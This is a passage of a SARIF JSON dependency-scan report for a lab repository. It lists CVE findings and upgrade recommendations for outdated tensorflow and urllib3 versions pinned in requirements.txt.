              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "7ff9c3d06b1e1574962e41c23177e2d0af7aa9e3"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25801",
          "ruleIndex": 447,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25801 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25801](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25801)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "39549728338625c3ca44e2ab11a4767bc693aa49"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25674",
          "ruleIndex": 448,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25674 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25674](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25674)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "464f9282b46b9f0f21865b03537be9e1b3a358ac"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25658",
          "ruleIndex": 449,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25658 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25658](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25658)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "4d2c9d26418b6ae834bf93273c666c42226ee36c"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25670",
          "ruleIndex": 450,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25670 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25670](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25670)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "d0b4b07cb0fbffde19b82dda9b5e75ba53c761a3"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-25664",
          "ruleIndex": 451,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-25664 (severity: high, fixed in 2.11.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-25664](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25664)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "df971339adbb3e6f1c9dff1776e1bebaeef012c0"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-33976",
          "ruleIndex": 452,
          "level": "error",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2023-33976 (severity: high, fixed in 2.12.1)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-33976](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33976)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "91752721bf2f6b86751eb6e858e9bf3943f049c4"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2019-11324",
          "ruleIndex": 453,
          "level": "error",
          "message": {
            "text": "Package: urllib3@1.24.1 (direct)\nVulnerability CVE-2019-11324 (severity: high, fixed in 1.24.2)\nSmartFix: 1.26.19 (Minimal version with no known vulnerabilities)\nLink: [CVE-2019-11324](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11324)\nSample path: requirements.txt -\u003e urllib3@1.24.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/urllib3@1.24.1\n  1.24.1 is vulnerable:\n    high       CVE-2019-11324       FixVersion= 1.24.2\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2019-11236       FixVersion= 1.24.3\n    medium     CVE-2018-25091       FixVersion= 1.24.2\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.24.2 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.24.3 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.25.9 is vulnerable:\n    high       CVE-2021-33503       FixVersion= 1.26.5\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.5 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.17 is vulnerable:\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.18 is vulnerable:\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.19 is not vulnerable\n\nFix recommendations for package pkg:pypi/urllib3@1.24.1\n  1.26.19 is the minimal version with no known vulnerabilities\n  1.26.19 is the maximum version and it has no known vulnerabilities\n  1.26.17 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 8 versions (nodes) and 25 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 6,
                  "endLine": 6
                }
              },
              "message": {
                "text": "requirements.txt: urllib3@1.24.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "09d69ee84d6d1f8eb8cf360a865d2ffeaf2a50f5"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2019-11236",
          "ruleIndex": 454,
          "level": "warning",
          "message": {
            "text": "Package: urllib3@1.24.1 (direct)\nVulnerability CVE-2019-11236 (severity: medium, fixed in 1.24.3)\nSmartFix: 1.26.19 (Minimal version with no known vulnerabilities)\nLink: [CVE-2019-11236](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-11236)\nSample path: requirements.txt -\u003e urllib3@1.24.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/urllib3@1.24.1\n  1.24.1 is vulnerable:\n    high       CVE-2019-11324       FixVersion= 1.24.2\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2019-11236       FixVersion= 1.24.3\n    medium     CVE-2018-25091       FixVersion= 1.24.2\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.24.2 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.24.3 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.25.9 is vulnerable:\n    high       CVE-2021-33503       FixVersion= 1.26.5\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.5 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.17 is vulnerable:\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.18 is vulnerable:\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.19 is not vulnerable\n\nFix recommendations for package pkg:pypi/urllib3@1.24.1\n  1.26.19 is the minimal version with no known vulnerabilities\n  1.26.19 is the maximum version and it has no known vulnerabilities\n  1.26.17 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 8 versions (nodes) and 25 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 6,
                  "endLine": 6
                }
              },
              "message": {
                "text": "requirements.txt: urllib3@1.24.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "a7dbd3d234c74ac890ad54df1db5b0783296f606"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2018-25091",
          "ruleIndex": 455,
          "level": "warning",
          "message": {
            "text": "Package: urllib3@1.24.1 (direct)\nVulnerability CVE-2018-25091 (severity: medium, fixed in 1.24.2)\nSmartFix: 1.26.19 (Minimal version with no known vulnerabilities)\nLink: [CVE-2018-25091](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-25091)\nSample path: requirements.txt -\u003e urllib3@1.24.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/urllib3@1.24.1\n  1.24.1 is vulnerable:\n    high       CVE-2019-11324       FixVersion= 1.24.2\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2019-11236       FixVersion= 1.24.3\n    medium     CVE-2018-25091       FixVersion= 1.24.2\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.24.2 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.24.3 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.25.9 is vulnerable:\n    high       CVE-2021-33503       FixVersion= 1.26.5\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.5 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.17 is vulnerable:\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.18 is vulnerable:\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.19 is not vulnerable\n\nFix recommendations for package pkg:pypi/urllib3@1.24.1\n  1.26.19 is the minimal version with no known vulnerabilities\n  1.26.19 is the maximum version and it has no known vulnerabilities\n  1.26.17 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 8 versions (nodes) and 25 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 6,
                  "endLine": 6
                }
              },
              "message": {
                "text": "requirements.txt: urllib3@1.24.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "92c14de78edcede02063ac6bb29d5c9ffd489449"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2020-26137",
          "ruleIndex": 456,
          "level": "warning",
          "message": {
            "text": "Package: urllib3@1.24.1 (direct)\nVulnerability CVE-2020-26137 (severity: medium, fixed in 1.25.9)\nSmartFix: 1.26.19 (Minimal version with no known vulnerabilities)\nLink: [CVE-2020-26137](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26137)\nSample path: requirements.txt -\u003e urllib3@1.24.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/urllib3@1.24.1\n  1.24.1 is vulnerable:\n    high       CVE-2019-11324       FixVersion= 1.24.2\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2019-11236       FixVersion= 1.24.3\n    medium     CVE-2018-25091       FixVersion= 1.24.2\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.24.2 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.24.3 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.25.9 is vulnerable:\n    high       CVE-2021-33503       FixVersion= 1.26.5\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.5 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.17 is vulnerable:\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.18 is vulnerable:\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.19 is not vulnerable\n\nFix recommendations for package pkg:pypi/urllib3@1.24.1\n  1.26.19 is the minimal version with no known vulnerabilities\n  1.26.19 is the maximum version and it has no known vulnerabilities\n  1.26.17 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 8 versions (nodes) and 25 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 6,
                  "endLine": 6
                }
              },
              "message": {
                "text": "requirements.txt: urllib3@1.24.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "0cfeeca90c9064f22bc542a8bbf31c883bf9b7a9"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-43804",
          "ruleIndex": 457,
          "level": "error",
          "message": {
            "text": "Package: urllib3@1.24.1 (direct)\nVulnerability CVE-2023-43804 (severity: high, fixed in 1.26.17)\nSmartFix: 1.26.19 (Minimal version with no known vulnerabilities)\nLink: [CVE-2023-43804](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-43804)\nSample path: requirements.txt -\u003e urllib3@1.24.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/urllib3@1.24.1\n  1.24.1 is vulnerable:\n    high       CVE-2019-11324       FixVersion= 1.24.2\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2019-11236       FixVersion= 1.24.3\n    medium     CVE-2018-25091       FixVersion= 1.24.2\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.24.2 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.24.3 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2020-26137       FixVersion= 1.25.9\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.25.9 is vulnerable:\n    high       CVE-2021-33503       FixVersion= 1.26.5\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.5 is vulnerable:\n    high       CVE-2023-43804       FixVersion= 1.26.17\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.17 is vulnerable:\n    medium     CVE-2023-45803       FixVersion= 1.26.18\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.18 is vulnerable:\n    medium     CVE-2024-37891       FixVersion= 1.26.19\n  1.26.19 is not vulnerable\n\nFix recommendations for package pkg:pypi/urllib3@1.24.1\n  1.26.19 is the minimal version with no known vulnerabilities\n  1.26.19 is the maximum version and it has no known vulnerabilities\n  1.26.17 is the minimal version with no critical or high vulnerabilities\n\nStats: the Version Graph has 8 versions (nodes) and 25 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 6,
                  "endLine": 6
                }
              },
              "message": {
                "text": "requirements.txt: urllib3@1.24.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "10e1a819e8d41e2c66a69cc4eedae9671d14e60d"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2023-45803",
          "ruleIndex": 458,
          "level": "warning",
          "message": {
